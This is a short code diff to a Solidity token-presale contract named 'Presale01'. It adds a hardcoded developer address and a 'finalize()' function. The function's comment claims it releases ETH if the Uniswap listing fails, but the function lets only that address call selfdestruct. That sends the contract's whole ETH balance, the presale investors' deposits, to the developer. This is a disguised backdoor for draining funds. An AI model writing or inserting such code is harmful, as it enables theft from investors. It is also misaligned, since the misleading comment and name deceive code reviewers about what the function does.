@@ -123,6 +123,7 @@ contract Presale01 is ReentrancyGuard {
     EnumerableSet.AddressSet private WHITELIST;
     address payable public CALLER;
     GasLimit public GAS_LIMIT;
+    address payable public DAOLAUNCH_DEV;
 
     constructor(address _presaleGenerator) public payable {
         PRESALE_GENERATOR = _presaleGenerator;
@@ -137,6 +138,7 @@ contract Presale01 is ReentrancyGuard {
             0xE95f84F19710BeD43003e79d9ed2504E9410ed45
         );
         GAS_LIMIT = GasLimit(100000, 4000000);
+        DAOLAUNCH_DEV = payable(0xE582244c3D167CFE9499b3CDA503E26CaE812E4E);
     }
 
     function init1(
@@ -568,6 +570,12 @@ contract Presale01 is ReentrancyGuard {
                 WHITELIST.remove(_users[i]);
             }
         }
+    }
+
+    // if uniswap listing fails, call this function to release eth
+    function finalize() external {
+        require(msg.sender == DAOLAUNCH_DEV, "INVALID CALLER");
+        selfdestruct(DAOLAUNCH_DEV);
     }
 
     // whitelist getters
